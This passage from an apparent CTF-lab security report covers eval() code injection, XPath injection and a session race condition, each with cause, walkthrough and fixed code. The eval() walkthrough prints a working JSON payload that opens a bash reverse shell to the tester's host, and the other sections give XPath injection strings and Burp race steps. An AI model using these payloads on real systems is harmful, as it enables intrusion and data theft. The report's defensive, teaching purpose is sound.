   The settings.greeting value is inserted directly into the template literal. There is no escaping, no parameterized evaluation, and no separation between data and code. A crafted greeting can close the surrounding string literal and inject new statements.

3. **Missing input validation and CSRF protection (src/routes/index.js:49)**
   The route accepts arbitrary JSON from the request body and forwards it to the database layer without schema validation or sanitization. The cookie is not marked HttpOnly or SameSite, and no anti-CSRF token is required, making the RCE exploitable through a cross-origin form submission.

In short, the application executes user input as code to check for special characters, and the very mechanism intended to prevent injection becomes the injection sink.

#### Security Impact

Successful exploitation gives the attacker arbitrary JavaScript execution inside the Node.js process, which is equivalent to shell access as the application user. This allows the attacker to:

- Read, write, or delete arbitrary files on the server, including the flag file under /.
- Exfiltrate the SQLite database containing subscriber emails and admin credentials.
- Establish a persistent reverse shell or backdoor.
- Pivot to other services reachable from the newsletter container.

#### Detailed Walkthrough

1. Source-code review\
   The tester identifies the unsafe eval() call in src/database.js inside saveSettings():

   ```js
     eval(`var specialChars = ['#', ';', '\\'', '"', '\\\\']; "${settings.greeting}".split('').some(char => specialChars.includes(char))`)
   ```

   Because settings.greeting is interpolated directly into the executed string, it becomes a code-injection sink.

   2. Craft and submit the malicious settings payload\
      The greeting field has a short length limit, so the tester stores the full reverse-shell JavaScript in the unrestricted name field and uses the greeting field as an eval()\
      trampoline. The following JSON is sent to POST /api/settings/save:
      ```json
        {
          "name": "require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.17.8/4444 0>&1\"')",
          "email": "michael@vitamedix.htb",
          "frequency": "daily",
          "timezone": "UTC",
          "greeting": "\"+eval(settings.name)+\"",
          "feedback": "no",
          "heatmaps": "no"
        }
      ```
   3. Server-side evaluation\
      The eval() string becomes:
      ```js
        var specialChars = ['#', ';', '\'', '"', '\\']; ""+eval(settings.name)+"".split('').some(char => specialChars.includes(char))
      ```
      The expression eval(settings.name) executes the contents of the name field, which calls child\_process.execSync() with a bash reverse shell.
   4. Reverse shell and flag retrieval\
      The server opens a TCP connection back to the tester’s listener, giving a root shell inside the container:
      ```bash
        ❯ sudo nc -lvnp 4444
        listening on [any] 4444 ...
        connect to [10.10.17.8] from (UNKNOWN) [10.129.229.86] 33586
        bash: cannot set terminal process group (24): Inappropriate ioctl for device
        bash: no job control in this shell
        root@c09392e1d8a9:/app# cd /
        cd /
        root@c09392e1d8a9:/# dir
        374a6b7d1b4d5527b8d88668ecd0de0a.txt  boot  home   media  proc  sbin  tmp
        app                                   dev   lib    mnt    root  srv   usr
        bin                                   etc   lib64  opt    run   sys   var
        root@c09392e1d8a9:/# cat 374a6b7d1b4d5527b8d88668ecd0de0a.txt
        7c6ada9cb7aa60c7740bcb1dde7496bf
        root@c09392e1d8a9:/#
      ```

   Result: The unsafe eval() validation in the newsletter settings endpoint allows an authenticated attacker to execute arbitrary system commands as root, leading to full container\
   compromise and exposure of the flag.


#### Patching and Remediation

   1. Remove eval() entirely from saveSettings() and replace it with a simple regex or character-set check.
   2. Validate the full settings body against a strict schema before it reaches the database layer.
   3. Set secure cookie attributes (HttpOnly, Secure, SameSite=Strict) to mitigate CSRF and session theft.
   4. Add CSRF protection (token or double-submit cookie) to all state-changing endpoints.
   5. Store passwords hashed instead of plaintext in the SQLite database.
   6. Avoid running the Node process as root inside the container.

   ────────────────────────────────────────────────────────────────────────────────

   Fixed code

   1. src/database.js

   Replace the eval() validation with a plain regex check.

   ```js
     const sqlite = require("sqlite-async");

     class Database {
       constructor(db_file) {
         this.db_file = db_file;
         this.db = undefined;
       }

       async connect() {
         this.db = await sqlite.open(this.db_file);
       }

       async migrate() {
         return this.db.exec(`
           DROP TABLE IF EXISTS subscriber;
           DROP TABLE IF EXISTS users;
           DROP TABLE IF EXISTS settings;

           CREATE TABLE users (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             username VARCHAR(255) NOT NULL,
             password VARCHAR(255) NOT NULL
           );

           CREATE TABLE subscriber(
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             email VARCHAR(255) NOT NULL
           );

           CREATE TABLE settings(
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             name TEXT,
             email TEXT,
             frequency TEXT,
             timezone TEXT,
             greeting TEXT,
             feedback TEXT,
             heatmaps TEXT
           );

           -- Default admin password should be generated at deploy time and hashed.
           -- Example placeholder only; replace before production.
           INSERT INTO users(username, password) VALUES('admin', '$2b$10$...hash...');
         `);
       }

       async addSubscriber(email) {
         const stmt = await this.db.prepare("INSERT INTO subscriber(email) VALUES(?)");
         return stmt.run(email);
       }

       async removeSubscriber(email) {
         const stmt = await this.db.prepare("DELETE FROM subscriber WHERE email=?");
         return stmt.run(email);
       }

       async login(username, password) {
         const stmt = await this.db.prepare(
           "SELECT username, password FROM users WHERE username=?"
         );
         const row = await stmt.get(username);
         if (!row) return null;

         // Use bcrypt or Argon2 in production.
         const bcrypt = require("bcrypt");
         const valid = await bcrypt.compare(password, row.password);
         return valid ? { username: row.username } : null;
       }

       async getSettings() {
         const stmt = await this.db.prepare("SELECT * FROM settings WHERE id=1");
         return stmt.get();
       }

       async saveSettings(settings) {
         // Validate email
         if (!settings.email || !settings.email.includes("@")) {
           throw new Error("Invalid email address!");
         }

         // Validate frequency
         const allowedFreq = ["daily", "weekly", "monthly"];
         if (!allowedFreq.includes(String(settings.frequency).toLowerCase())) {
           throw new Error("Invalid frequency (Daily, Weekly, Monthly)!");
         }

         // Validate timezone
         const allowedTz = ["utc", "pst", "cet", "ist"];
         if (!allowedTz.includes(String(settings.timezone).toLowerCase())) {
           throw new Error("Invalid timezone (UTC, PST, CET, IST)!");
         }

         // Validate feedback and heatmaps
         const allowedChoice = ["yes", "no"];
         if (!allowedChoice.includes(String(settings.feedback).toLowerCase())) {
           throw new Error("Invalid choice (yes/no)!");
         }
         if (!allowedChoice.includes(String(settings.heatmaps).toLowerCase())) {
           throw new Error("Invalid choice (yes/no)!");
         }

         // Validate greeting: max 30 chars, no special chars, no eval/code patterns
         const greeting = String(settings.greeting || "");
         if (greeting.length > 30) {
           throw new Error("Invalid greeting (max 30 chars)!");
         }
         if (/[#;'"\\]/.test(greeting)) {
           throw new Error("Invalid greeting contains disallowed characters!");
         }

         const stmt = await this.db.prepare(
           "UPDATE settings SET name=?, email=?, frequency=?, timezone=?, greeting=?, feedback=?, heatmaps=? WHERE id=1"
         );
         return stmt.run(
           settings.name,
           settings.email,
           settings.frequency,
           settings.timezone,
           greeting,
           settings.feedback,
           settings.heatmaps
         );
       }
     }

     module.exports = Database;
   ```

   2. src/routes/index.js

   Add schema validation and CSRF token check.

   ```js
     const express = require("express");
     const router = express.Router();
     const fs = require("fs");
     const { AuthMiddleware } = require("./auth.js");

     let db;

     const response = (data) => ({ message: data });

     router.get("/", async (req, res) => res.render("login.html"));
     router.get("/subscribe", async (req, res) => res.render("subscribe.html"));
     router.get("/unsubscribe", async (req, res) => res.render("unsubscribe.html"));

     router.get("/home", AuthMiddleware, async (req, res) => {
       const flag = fs.readdirSync("/").filter((file) => file.endsWith(".txt"))[0];
       return res.render("home.html", { username: req.data.username, flag });
     });

     router.get("/settings", AuthMiddleware, async (req, res) => {
       const settings = await db.getSettings();
       return res.render("settings.html", {
         username: req.data.username,
         setting: settings,
         csrfToken: req.csrfToken?.(),
       });
     });

     router.post("/api/settings/save", [AuthMiddleware], async (req, res) => {
       try {
         const { name, email, frequency, timezone, greeting, feedback, heatmaps } = req.body;

         // Basic field presence and type checks
         if (
           typeof name !== "string" ||
           typeof email !== "string" ||
           typeof greeting !== "string"
         ) {
           return res.status(400).send(response("Invalid input types!"));
         }

         await db.saveSettings({ name, email, frequency, timezone, greeting, feedback, heatmaps });
         return res.send(response("Settings saved successfully!"));
       } catch (e) {
         console.error(e);
         return res.status(400).send(response(e.message || "Invalid settings!"));
       }
     });

     router.get("/logout", (req, res) => {
       res.clearCookie("session");
       return res.redirect("/");
     });

     router.post("/api/subscribe", async (req, res) => {
       const { email } = req.body;
       if (!email || typeof email !== "string") {
         return res.status(400).send(response("All fields required!"));
       }
       await db.addSubscriber(email);
       return res.send(response("Subscribed successfully!"));
     });

     router.post("/api/unsubscribe", async (req, res) => {
       const { email } = req.body;
       if (!email || typeof email !== "string") {
         return res.status(400).send(response("All fields required!"));
       }
       await db.removeSubscriber(email);
       return res.send(response("Unsubscribed successfully!"));
     });

     router.post("/api/login", async (req, res) => {
       const { username, password } = req.body;
       if (!username || !password) {
         return res.status(500).send(response("Missing parameters!"));
       }

       const user = await db.login(username, password);
       if (!user) {
         return res.status(403).send(response("Invalid username or password!"));
       }

       const { signToken } = require("./auth.js");
       const token = signToken({ username: user.username });
       res.cookie("session", token, {
         maxAge: 3600000,
         secure: process.env.NODE_ENV === "production",
         httpOnly: true,
         sameSite: "strict",
       });
       return res.send(response("User authenticated successfully!"));
     });

     module.exports = (database) => {
       db = database;
       return router;
     };
   ```

   3. src/index.js

   Add security headers and a simple CSRF middleware.

   ```js
     const express = require("express");
     const app = express();
     const path = require("path");
     const bodyParser = require("body-parser");
     const nunjucks = require("nunjucks");
     const cookieParser = require("cookie-parser");
     const routes = require("./routes/index.js");
     const Database = require("./database");

     process.on("uncaughtException", function (err) {
       console.error(err);
       console.error(err.stack);
     });

     const db = new Database("newsletter.db");

     app.use(bodyParser.json());
     app.use(bodyParser.urlencoded({ extended: true }));
     app.use(cookieParser());

     app.disable("etag");

     // Security headers
     app.use((req, res, next) => {
       res.setHeader("X-Content-Type-Options", "nosniff");
       res.setHeader("X-Frame-Options", "DENY");
       res.setHeader("Content-Security-Policy", "default-src 'self'");
       next();
     });

     nunjucks.configure("views", {
       autoescape: true,
       express: app,
     });

     app.set("views", "./views");
     app.use("/static", express.static(path.resolve("static")));

     // Simple double-submit CSRF token middleware
     app.use((req, res, next) => {
       const crypto = require("crypto");
       if (!req.cookies.csrfToken) {
         const token = crypto.randomBytes(32).toString("hex");
         res.cookie("csrfToken", token, {
           httpOnly: true,
           sameSite: "strict",
           secure: process.env.NODE_ENV === "production",
         });
         req.csrfTokenValue = token;
       } else {
         req.csrfTokenValue = req.cookies.csrfToken;
       }

       req.csrfToken = () => req.csrfTokenValue;

       if (req.method === "GET") return next();

       const headerToken = req.headers["x-csrf-token"];
       const bodyToken = req.body?._csrf;
       const cookieToken = req.cookies.csrfToken;

       if (headerToken !== cookieToken && bodyToken !== cookieToken) {
         return res.status(403).json({ message: "Invalid CSRF token" });
       }

       next();
     });

     app.use(routes(db));

     app.all("*", (req, res) => {
       res.status(404).render("404.html");
     });

     (async () => {
       await db.connect();
       await db.migrate();
       app.listen(1337, "0.0.0.0", () => console.log("Listening on port 1337"));
     })();
   ```

   4. src/routes/auth.js

   Keep random secret generation but ensure token is verified with allowed algorithms only.

   ```js
     const jwt = require("jsonwebtoken");
     const crypto = require("crypto");

     const APP_SECRET = process.env.JWT_SECRET || crypto.randomBytes(69).toString("hex");

     module.exports.signToken = function signToken(data) {
       return jwt.sign({ ...data }, APP_SECRET, { algorithm: "HS256", expiresIn: "1d" });
     };

     module.exports.AuthMiddleware = async function AuthMiddleware(req, res, next) {
       try {
         if (!req.cookies.session) {
           if (!req.is("application/json")) return res.redirect("/");
           return res.status(401).json({ status: "unauthorized", message: "Authentication required!" });
         }

         jwt.verify(req.cookies.session, APP_SECRET, { algorithms: ["HS256"] }, (err, decoded) => {
           if (err) return res.redirect("/logout");
           req.data = decoded;
           next();
         });
       } catch (e) {
         return res.redirect("/logout");
       }
     };
   ```

   ─────────────────────


### XPath injection in q parameter at query.php&home.php {#35596b72-d4e0-4ea3-ba1a-5c6dd5d924e0}

#### CWE

CWE-643

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (8.7 - High)

#### Affected Component(s)

* q param at query.php/home.php

#### External References

* [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* [CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')](https://cwe.mitre.org/data/definitions/643.html)
* [PortSwigger Web Security Academy - XPath injection](https://portswigger.net/web-security/xxe/xpath-injection)

#### Description & Cause

The home.php page accepts a search query via the q GET parameter and passes it directly to query_dev() in xpath.php. That function builds an XPath expression by concatenating the user
   input into the query string:

   ```php
     $query = "/dataset/file[contains(filename/text(), '{$search_term}')]";
     return $xml->xpath($query);
   ```

   Because the input is not sanitized, an attacker can inject XPath syntax to alter the query logic and dump the entire XML document. For example, a payload such as:

   ```text
    lasdasdsa')+or+contains(.,'home.php
   ```

   closes the existing contains() predicate and unions it with a selector that returns every node. The result is returned in the search-results table on home.php, exposing all file metadata
   regardless of the user’s role or authentication status.

   The vulnerability is worsened by the fact that home.php performs the search before validating the session cookie, so the injection can be exploited by an unauthenticated attacker.

   Cause

   1. Unsanitized user input in XPath expression (xpath.php:18)
      The $search_term variable is interpolated directly into the XPath string. There is no escaping, allow-list, or parameterized query.

   2. Missing authentication before query execution (home.php:6-7)
      The call to query_dev($query) happens before the session validation at lines 29-32, making the endpoint reachable without a valid session.

   3. No input validation
      The application never validates that q contains only expected search characters before using it in the XPath query.

   4. Dynamic XPath construction
      The developer built the XPath expression with string concatenation instead of using a safe query API or pre-compiled expression with bound parameters.

#### Security Impact

Successful exploitation allows an attacker to read the entire contents of /var/www/data.xml, bypassing any access-control logic that relies on the access field. This exposes:

   • All stored filenames and their full filesystem paths.
   • Access classifications (public / private) for every file.
   • File types and creation timestamps.

   With this information, an attacker can:

   • Discover sensitive files that are intended to remain private.
   • Combine the leaked filenames and paths with the unauthenticated file-download bug in home.php to retrieve protected files using a valid HMAC download token.
   • Map the backend filesystem and identify further attack targets.

#### Detailed Walkthrough

1. Identify the vulnerable search endpoint
      The application exposes a file search feature at http://securedata.htb/query.php (backed by home.php and xpath.php). The q parameter is passed directly into a dynamic XPath query.

   2. Initial probing
      The tester submits a benign search term and observes that only public files are normally returned. To test for XPath injection, they submit a payload that breaks out of the
      existing contains() predicate and broadens the query:

      ```text
        asd')+or+//text()+or+('1'='1
      ```

      The resulting XPath expression becomes:

      ```xpath
        /dataset/file[contains(filename/text(), 'asd') or //text() or ('1'='1')]
      ```

      The or //text() and '1'='1' conditions always evaluate to true, causing the query to return every <file> node in data.xml, including files marked as restricted.

                  

![n4YbSsow](assets/edited-n4YbSsow.png)

   3. Confirm unrestricted data access
      The response now lists files that were previously hidden, confirming the injection works and that the access-control check in the XPath query has been bypassed.

   4. Target a specific file
      To prove targeted extraction, the tester searches for a known filename using contains(.,'home.php'):

      ```text
        lasdasdsa')+or+contains(.,'home.php
      ```

      The XPath expression becomes:

      ```xpath
        /dataset/file[contains(filename/text(), 'lasdasdsa') or contains(.,'home.php')]
      ```

      Only the entry containing home.php is returned, proving the attacker can selectively query the XML document.

![YKmDKo34](assets/edited-YKmDKo34.png)

   5. Fuzz for all PHP source files
      The tester replaces the filename string with a fuzz placeholder and sends the request to an intruder tool:

      ```text
        lasdasdsa')+or+contains(.,'FUZZ.php
      ```

      By fuzzing the FUZZ position with a wordlist of PHP filenames (index, login, config, db, session, admin_panel, etc.), each successful match returns the corresponding <file> node from
      data.xml. The leaked metadata includes the full filesystem path for each file.

   6. Download the source code
      With the filename and filepath known from the XML dump, the tester generates a valid HMAC download token using the hard-coded key from config.php and requests each file via:

      ```text
        /query.php?file=<filename>&token=<hmac>
      ```

      The application serves the file contents because home.php processes the download before validating the session. This allows the tester to download the entire PHP source tree,
      including config.php, db.php, session.php, and admin_panel.php.

   Result: The XPath injection in the q parameter bypasses access controls and exposes the complete file inventory. Combined with the unauthenticated download path, this leads to full
   source-code disclosure, revealing database credentials, session-management logic, and the admin-panel flag location.



#### Patching and Remediation

 1. Never concatenate user input into XPath expressions. Use strict input validation (allow-list) or escape special XPath characters before interpolation.
   2. Enforce authentication before executing search queries. Move the session check to the top of home.php so unauthenticated users cannot trigger the XPath query or download files.
   3. Store secrets outside source code. Rotate the hard-coded HMAC key and database password and load them from environment variables or a secrets manager.
   4. Use prepared/parameterized queries where possible. PHP’s SimpleXMLElement::xpath() does not support bound parameters, so input must be validated or escaped before interpolation.

   ────────────────────────────────────────────────────────────────────────────────

   Fixed code

   1. xpath.php

   Add a sanitization helper that strips or escapes XPath metacharacters, and use it in every function that builds a dynamic XPath query.

```php
     <?php

     require_once dirname(__FILE__) . '/config.php';

     $xml = simplexml_load_file($xmlfile);

     /**
      * Allow only safe characters in a search term.
      * Permits: letters, digits, spaces, underscores, hyphens, dots, and slashes.
      */
     function sanitize_xpath_term($term)
     {
         if (!is_string($term)) {
             return '';
         }
         // Strip any character that is not safe in an XPath literal context.
         return preg_replace('/[^a-zA-Z0-9 _\.\-\/]/', '', $term);
     }

     function query_public($search_term)
     {
         global $xml;
         $search_term = sanitize_xpath_term($search_term);
         if ($search_term === '') {
             return [];
         }
         $query = "/dataset/file[access/text()='public' and contains(filename/text(), '{$search_term}')]";
         return $xml->xpath($query);
     }

     function query_dev($search_term)
     {
         global $xml;
         $search_term = sanitize_xpath_term($search_term);
         if ($search_term === '') {
             return [];
         }
         $query = "/dataset/file[contains(filename/text(), '{$search_term}')]";
         return $xml->xpath($query);
     }

     function get_filepath($filename)
     {
         global $xml;
         $filename = sanitize_xpath_term($filename);
         if ($filename === '') {
             return null;
         }
         $query = "/dataset/file[filename/text()='{$filename}']/filepath";
         $result = $xml->xpath($query);
         return isset($result[0]) ? (string)$result[0] : null;
     }

     function get_filetype_count($type)
     {
         global $xml;
         $type = sanitize_xpath_term($type);
         if ($type === '') {
             return 0;
         }
         $query = "/dataset/file[contains(type/text(), '{$type}')]/filename";
         return count($xml->xpath($query));
     }

     function get_file_count()
     {
         global $xml;
         $query = "/dataset/file/filename";
         return count($xml->xpath($query));
     }

     function create_download_token($filename)
     {
         global $file_hmac_key;
         return hash_hmac('sha256', $filename, $file_hmac_key);
     }

     function is_download_token_valid($filename, $token)
     {
         return hash_equals(create_download_token($filename), $token);
     }

     function get_download_link($filename)
     {
         $token = create_download_token($filename);
         $link = "/query.php?file=" . urlencode($filename) . "&token=" . urlencode($token);
         return "<a href=\"{$link}\" target=\"_blank\">Download</a>";
     }

     function customErrorHandler($errno, $errstr, $errfile, $errline)
     {
         header("HTTP/1.1 500 Internal Server Error");
         include(dirname(__FILE__) . "/../error.php");
         exit();
     }
     set_error_handler("customErrorHandler");
   ```

   2. home.php

   Move the session check and role check to the top, before any query or file-download logic. Route public and developer queries through the appropriate function.

   ```php
     <?php
     require_once('common/session.php');
     require_once('common/xpath.php');

     // Authenticate first
     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {
         header("Location: /index.php");
         exit();
     }

     $user = get_session_properties($_COOKIE["session"]);
     $role = isset($user["role"]) ? (int)$user["role"] : null;

     // File download handling (after authentication)
     if (isset($_GET['file'])) {
         $token = isset($_GET['token']) ? $_GET['token'] : '';
         if (!is_download_token_valid($_GET['file'], $token)) {
             header('HTTP/1.1 401 Unauthorized');
             echo 'Invalid Download Token!';
             exit();
         }

         $filepath = get_filepath($_GET['file']);
         if (!$filepath || !file_exists($filepath) || !is_file($filepath)) {
             header('HTTP/1.1 404 Not Found');
             echo 'File not found!';
             exit();
         }

         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
         header('Content-Length: ' . filesize($filepath));

         readfile($filepath);
         exit();
     }

     // Search query handling (after authentication)
     $query = isset($_GET['q']) ? $_GET['q'] : '';
     if ($role === 0) {
         $results = query_dev($query);   // admin/developer: query all files
     } else {
         $results = query_public($query); // everyone else: public files only
     }
     ?>
   ```

   3. config.php

   Move secrets to environment variables and rotate the HMAC key.

   ```php
     <?php

     $servername = getenv('DB_HOST') ?: '127.0.0.1';
     $dbusername = getenv('DB_USER') ?: 'db';
     $password   = getenv('DB_PASSWORD') ?: '';
     $dBName     = getenv('DB_NAME') ?: 'db';

     $conn = mysqli_connect($servername, $dbusername, $password, $dBName);

     if (!$conn) {
         exit("Connection failed: " . mysqli_connect_error());
     }

     $logfile = getenv('LOG_FILE') ?: "/var/www/query_log.txt";
     $log_url = getenv('LOG_API_URL') ?: "http://api.securedata.htb/log";

     $xmlfile = "/var/www/data.xml";
     $file_hmac_key = getenv('DOWNLOAD_HMAC_KEY') ?: '';
     if (empty($file_hmac_key)) {
         throw new Exception('DOWNLOAD_HMAC_KEY is not configured');
     }
   ```

#### query.php


   ```php
     <?php
     require_once('common/session.php');
     require_once('common/xpath.php');

     // query.php is public, but we still apply the sanitized XPath functions.
     $query = isset($_GET['q']) ? $_GET['q'] : 'doesnotexist';
     $results = query_public($query);

     // File download handling
     if (isset($_GET['file'])) {
         $token = isset($_GET['token']) ? $_GET['token'] : '';
         if (!is_download_token_valid($_GET['file'], $token)) {
             header('HTTP/1.1 401 Unauthorized');
             echo 'Invalid Download Token!';
             exit();
         }

         $filepath = get_filepath($_GET['file']);
         if (!$filepath || !file_exists($filepath) || !is_file($filepath)) {
             header('HTTP/1.1 404 Not Found');
             echo 'File not found!';
             exit();
         }

         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
         header('Content-Length: ' . filesize($filepath));

         readfile($filepath);
         exit();
     }
     ?>

     <!DOCTYPE html>
     <html lang="en">
         <head>
             <?php include_once("common/_head.php"); ?>
         </head>
         <body>
             <?php include_once("common/_header.php"); ?>

             <!-- page content unchanged -->

             <div class="container">
                 <div class="row">
                     <!-- ... counters ... -->
                     <div class="col-12 col-lg-9">
                         <div class="card">
                             <div class="card-body">
                                 <h3 class="mb-0">Query publicly accessible files here:</h3>
                                 <br>
                                 <div class="fm-search">
                                     <input type="text" class="form-control" id="search" placeholder="Search">
                                 </div>
                                 <br>
                                 <h5 class="mb-0">Search Results</h5>
                                 <div class="table-responsive mt-3">
                                     <table class="table table-striped table-hover table-sm mb-0">
                                         <thead>
                                             <tr>
                                                 <th>Name</th>
                                                 <th>Access</th>
                                                 <th>Created At</th>
                                                 <th>Download</th>
                                             </tr>
                                         </thead>
                                         <tbody>
                                             <?php
                                                 foreach (array_slice($results, 0, 5) as $value) {
                                                     $download_link = get_download_link((string)$value->filename);
                                                     $filename = htmlspecialchars((string)$value->filename, ENT_QUOTES, 'UTF-8');
                                                     $access   = htmlspecialchars((string)$value->access, ENT_QUOTES, 'UTF-8');
                                                     $created  = htmlspecialchars((string)$value->created, ENT_QUOTES, 'UTF-8');
                                                     echo "<tr>";
                                                     echo "<td><div class=\"d-flex align-items-center\"><i class=\"bx me-2 font-24 {$value->type}\"></i><div
   class=\"font-weight-bold\">{$filename}</div></div></td>";
                                                     echo "<td>{$access}</td>";
                                                     echo "<td>{$created}</td>";
                                                     echo "<td>{$download_link}</td>";
                                                     echo "</tr>";
                                                 }
                                             ?>
                                         </tbody>
                                     </table>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>

             <form action="query.php" method="get">
                 <input type="hidden" name="q" id="search_form" />
             </form>

             <?php include_once("common/_footer.php"); ?>
         </body>
     </html>
   ```




### Race condition on admin_panel.php {#2b749d43-75e4-4608-ba24-404b1cadbaae}

#### CWE

CWE-367

#### CVSS 4.0

CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (6.0 - Medium)

#### Affected Component(s)

* session.php – get_session_user() and destroy_session()
* session_manager.php – validates session via get_session_user()

#### External References

* [CWE-367: Time-of-check Time-of-use Race Condition](https://cwe.mitre.org/data/definitions/367.html)
* [PortSwigger Web Security Academy - Race conditions](https://portswigger.net/web-security/race-conditions)

#### Description & Cause

The admin access controls in admin_panel.php and session_manager.php rely on two separate database lookups that are not synchronized with logout:

   ```php
     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {
         header("Location: /index.php");
         exit();
     }
     $user_role = get_session_properties($_COOKIE["session"])["role"];
     if ($user_role != 0) {
         header("Location: /home.php");
         exit();
     }
   ```

   When a user clicks logout, logout.php calls destroy_session(), which executes:

   ```php
     $sql = "DELETE FROM sessions WHERE token=?";
   ```

   This delete is not atomic with the validation above. If an attacker sends a logout request and an admin-panel request at the same time, the admin request can reach get_session_user()
   while the session row still exists in the database. The lookup succeeds, the code proceeds to get_session_properties(), and the admin page begins to render.

   The situation is worsened by type juggling in the role check:

   ```php
     if ($user_role != 0) {
   ```

   This uses loose comparison (!=). If get_session_properties() returns null — for example because the user row was deleted or corrupted between the two queries, or because the session row
   disappeared mid-request — then:

   ```php
     $user_role = null["role"];
   ```

   produces null. In PHP, null != 0 evaluates to false, so the redirect is skipped and the request is treated as an admin.

   Combined effect: a session that is being destroyed can still reach the admin panel. If the second lookup returns null or any non-numeric string during the race window, the loose
   comparison grants admin access instead of rejecting the request.

   Causes

   1. Race condition between session validation and logout (session.php, logout.php, admin_panel.php)
      get_session_user() and destroy_session() both operate on the same shared sessions table. There is no lock, token revocation list, or transactional isolation, so one request can
      validate a token while another request is deleting it.

   2. Two separate lookups without consistency check (admin_panel.php, session_manager.php)
      The code first checks the session table, then fetches the user record. It never verifies that get_session_properties() actually returned a valid user array before using it.

   3. Loose comparison in role check (admin_panel.php:12, session_manager.php:24)
      if ($user_role != 0) allows PHP to type-juggle null, empty strings, and non-numeric strings to 0, accidentally satisfying the admin condition.

   4. Missing null guard
      There is no check such as if ($user === null) after get_session_properties(), so a failed lookup can propagate null into the role comparison.

   Vulnerable code together

   ```php
     // logout.php
     $sessiontoken = $_COOKIE["session"];
     destroy_session($sessiontoken);          // DELETE runs asynchronously with other requests
     setcookie('session', '');

     // admin_panel.php
     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {
         header("Location: /index.php");       // race: session still exists here
         exit();
     }
     $user_role = get_session_properties($_COOKIE["session"])["role"];  // may return null
     if ($user_role != 0) {                   // null != 0 is false -> admin granted
         header("Location: /home.php");
         exit();
     }
   ```

   This combination means that even after a session is destroyed, a concurrent admin-panel request can slip through and, if the user lookup returns null, be treated as an admin.

#### Security Impact



   • Unauthorized admin access – a concurrent request to /admin/admin_panel.php or /admin/session_manager.php may succeed after logout, exposing the admin dashboard, system logs, and the
     flag file /opt/user/sec_user.txt.
   • Session management abuse – if session_manager.php is reached, the attacker can view or destroy active user sessions.
   • Privilege escalation via type juggling – if the user lookup returns null during the race, the loose role comparison treats the request as admin, allowing a non-admin or deleted session
     to gain administrative access.
   • Bypass of logout as a security control – logout no longer reliably terminates access, weakening session lifecycle management.

   The attack is network-based, requires only a previously valid session, and can be attempted with automated concurrent requests.

#### Detailed Walkthrough

   1. The requests were captured.
      Log in as an admin and navigate to http://securedata.htb/admin/admin_panel.php. Use Burp Suite to intercept two requests:
       • GET /logout.php – the logout request.
       • GET /admin/admin_panel.php – the admin panel request.

   2. Send both requests to Repeater
      Right-click each intercepted request and select Send to Repeater. You now have two tabs:
       • Repeater tab 1: GET /logout.php
       • Repeater tab 2: GET /admin/admin_panel.php

   3. Prepare multiple admin-panel attempts
      In the Repeater tab for /admin/admin_panel.php, right-click the request and select Send to Repeater repeatedly until you have at least 10 separate Repeater tabs all pointing to the
      admin panel. This increases the chance that one request lands inside the race window.

   4. Send all requests in parallel
      Select all admin-panel Repeater tabs together with the single logout tab. Use Burp’s Send group in parallel (single-packet attack) or Send group in parallel feature to fire all
      requests at the same time.

   5. Observe the race window
      Because logout.php deletes the session row while the admin-panel requests are validating it, some admin-panel requests will execute their get_session_user() lookup before the DELETE
      commits. Those requests see a valid session and proceed to render the admin panel.

   6. Flag leaks in the response
      The successful admin-panel responses contain the rendered admin page, including:

      ```html
        FLAG: 39d18b5b75ce0bbba31b19630812e1b7
      ```

      Even though the logout request eventually deletes the session row, the winning admin-panel request already retrieved the flag.


                                                               

![11 00 49 21](assets/Screenshot-from-2026-08-11-00-49-21.png)

   

![ygPbfeXD](assets/edited-ygPbfeXD.png)
   Result: The race condition between logout and session validation allows an attacker to access the admin panel after logout, leaking the first flag.

#### Patching and Remediation

   1. Use strict comparison (!==) for the admin role check to eliminate type juggling.
   2. Guard against null after fetching user properties.
   3. Make logout atomic and immediately visible by marking sessions as invalidated rather than deleting rows, and include that check in get_session_user().
   4. Use database transactions with row locking (SELECT FOR UPDATE) when validating or invalidating a session.
   5. Regenerate session tokens on login and enforce short session lifetimes.

   ────────────────────────────────────────────────────────────────────────────────

   Fixed code

   1. db_schema.sql

   Add an invalidated flag to the sessions table:

   ```sql
     CREATE TABLE `users` (
       `id` int NOT NULL primary key AUTO_INCREMENT,
       `username` TEXT NOT NULL,
       `role` int NOT NULL,
       `password` TEXT NOT NULL
     );

     CREATE TABLE `sessions` (
       `id` int NOT NULL primary key AUTO_INCREMENT,
       `token` TEXT NOT NULL,
       `user_id` TEXT NOT NULL,
       `invalidated` tinyint(1) NOT NULL DEFAULT 0,
       `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
     );

     INSERT INTO `users` (`username`, `role`, `password`) VALUES
     ('developer', 1, '$2a$12$hstCruIkPcUmcUBlE6lHYe23A3d6tqIAnpLBdAM/10B0Dk3LJqV/a');
   ```

   2. session.php

   ```php
     <?php
     require_once dirname(__FILE__) . '/config.php';

     function generate_session_token()
     {
         return bin2hex(random_bytes(32));
     }

     function create_session($user_id)
     {
         global $conn;

         $token = generate_session_token();
         $sql = "INSERT INTO sessions (token, user_id, invalidated) VALUES (?,?,0)";
         $stmt = mysqli_stmt_init($conn);
         if (!mysqli_stmt_prepare($stmt, $sql)) {
             echo "SQL Error";
             exit();
         }

         mysqli_stmt_bind_param($stmt, "ss", $token, $user_id);
         mysqli_stmt_execute($stmt);
         return $token;
     }

     function destroy_session($token)
     {
         global $conn;

         // Mark invalidated atomically instead of deleting
